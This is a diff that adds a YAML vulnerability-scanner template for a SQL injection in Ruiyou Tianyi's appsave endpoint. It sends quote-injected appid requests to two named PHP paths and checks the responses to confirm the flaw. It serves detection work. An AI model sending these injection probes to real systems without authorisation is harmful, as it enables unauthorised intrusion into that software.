@@ -1,0 +1,30 @@
+id: ruiyou-appsave-sqli
+info:
+  name: 瑞友天翼 - SQL 注入漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1251010
+    vendor: ruiyou
+    product: appsave
+  tags: sqli,vuln,ruiyou
+flow: http(1) && http(2)
+http:
+- method: GET
+  path:
+  - "{{BaseURL}}/index.php?s=/Admin/appsave&appid=3'"
+  - "{{BaseURL}}/hmrao.php?s=/Admin/appsave&appid=3'"
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 404 && contains(header, "think_language")'
+- method: GET
+  path:
+  - "{{BaseURL}}/index.php?s=/Admin/appsave&appid=3'-'"
+  - "{{BaseURL}}/hmrao.php?s=/Admin/appsave&appid=3'-'"
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, "appInfo")'
